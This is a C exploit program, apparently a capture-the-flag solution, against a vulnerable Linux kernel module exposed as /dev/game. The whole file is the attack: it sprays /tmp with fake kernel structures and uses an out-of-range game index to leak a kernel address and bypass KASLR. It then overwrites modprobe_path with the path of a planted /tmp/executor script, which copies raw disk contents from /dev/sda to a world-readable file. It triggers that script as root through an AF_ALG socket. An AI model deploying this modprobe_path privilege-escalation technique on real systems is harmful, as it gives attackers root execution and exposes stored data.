#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <fcntl.h>
#include <sys/mman.h>

#define A_NEW_GAME 0x0101
#define A_MAKE_GUESS 0x0102
#define A_GET_RESULT 0x0103
#define A_DELETE_GAME 0x0104
#define A_CHANGE_PLAYER_NAME 0x0105
#define SPRAY_FILE_SIZE 1024 * 128

struct new_game_request {
    char player_name[64];
};

struct make_guess_request {
    uint64_t index;
    uint32_t guess;
};

struct get_result_request {
    uint64_t index;
    uint8_t result[16];
};

struct delete_game_request {
    uint64_t index;
};

struct change_player_name_request {
    uint64_t index;
    char new_player_name[64];
};

struct fake_game_kernel_struct {
    uint64_t id;                    // Internal game ID
    char *ptr_AW;              // Player name
    char *ptr_AR;                   // Game result ("GOOOOOL" or "NE GOL")
    uint32_t pad;         // Secret number
    uint32_t pad1;             // Game activity flag
};

int main() {
    int fd;
    int ret;
    uint64_t game_index = 0;
    uint32_t guess;
    
    fd = open("/dev/game", O_RDWR);
    if (fd < 0) {
        perror("Failed to open /dev/game");
        return 1;
    }
    
    // spray with evil structs in file
    // because we use initramfs and it stored in RAM memory
    
    struct fake_game_kernel_struct fake_game;
    fake_game.id = 0;
    fake_game.ptr_AW = (char*)(0xfffffe0000000004);
    fake_game.ptr_AR = (char*)(0xfffffe0000000004);
    fake_game.pad = 0;
    fake_game.pad1 = 0;

    for (int i = 0; i < 512; i++) {
        char filename[256];
        sprintf(filename, "/tmp/evil_struct_%d", i);
        int tmp_fd = open(filename, O_CREAT | O_RDWR);
        
        if (tmp_fd < 0) {
            printf("Failed to open /tmp/evil_struct_%d\n", i);
            return 1;
        }

        char* buf = (char*) malloc(SPRAY_FILE_SIZE);
        for (int j = 0; j < SPRAY_FILE_SIZE / sizeof(fake_game); j++) {
            memcpy(&buf[j * sizeof(fake_game)], &fake_game, sizeof(fake_game));
        }

        write(tmp_fd, buf, SPRAY_FILE_SIZE);
        free(buf);
        close(tmp_fd);
        
        chmod(filename, 0644);
    }

    // create new game
    struct new_game_request new_game_req;
    strcpy(new_game_req.player_name, "test_game");
    ret = ioctl(fd, A_NEW_GAME, &new_game_req);
    if (ret < 0) {
        perror("Failed to create new game");
        return 1;
    }
    printf("New game created with index: %llu\n", ret);
    
    struct get_result_request result_req;
    memset(result_req.result, 0, 16);
    result_req.index = 740046;
    ret = ioctl(fd, A_GET_RESULT, &result_req);
    if (ret < 0) {
        perror("Failed to get result");
        return 1;
    }

    uint64_t KASLR_leak = *(uint64_t*)(result_req.result);
    uint64_t KASLR_base = KASLR_leak - 0x1008e00;
    uint64_t modprobe_path = KASLR_base + 0x2fde720;

    printf("KASLR leak: 0x%llx\n", KASLR_leak);
    printf("KASLR base: 0x%llx\n", KASLR_base);
    printf("modprobe path: 0x%llx\n", modprobe_path);

    // overwrite modprobe path
    // change files evil structs to point to modprobe path
    fake_game.id = 0;
    fake_game.ptr_AW = (char*)(modprobe_path);
    fake_game.ptr_AR = (char*)(modprobe_path);
    fake_game.pad = 0;
    fake_game.pad1 = 0;

    for (int i = 0; i < 512; i++) {
        char filename[256];
        sprintf(filename, "/tmp/evil_struct_%d", i);
        int tmp_fd = open(filename, O_RDWR);
        
        if (tmp_fd < 0) {
            perror("Failed to open /tmp/evil_struct");
            return 1;
        }

        char* buf = (char*) malloc(SPRAY_FILE_SIZE);
        for (int j = 0; j < SPRAY_FILE_SIZE / sizeof(fake_game); j++) {
            memcpy(&buf[j * sizeof(fake_game)], &fake_game, sizeof(fake_game));
        }

        write(tmp_fd, buf, SPRAY_FILE_SIZE);
        free(buf);
        close(tmp_fd);
    }

    int executor_fd = open("/tmp/executor", O_RDWR | O_CREAT);
    write(executor_fd, "#!/bin/sh\ncat /dev/sda > /tmp/flag;\nchmod 777 /tmp/flag;\n\x00", 59);
    close(executor_fd);
    chmod("/tmp/executor", 0777);

    struct change_player_name_request change_player_name_req;
    change_player_name_req.index = 740046;
    memset(change_player_name_req.new_player_name, 0, 64);
    strcpy(change_player_name_req.new_player_name, "/tmp/executor\x00");
    
    // overwrite modprobe path
    ret = ioctl(fd, A_CHANGE_PLAYER_NAME, &change_player_name_req);
    if (ret < 0) {
        perror("Failed to change player name");
        return 1;
    }

    // trigger modprobe
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
        perror("socket(AF_ALG) failed");
        return 1;
    }

    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "V4bel");  // dummy string
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));

    close(fd);
    return 0;
}
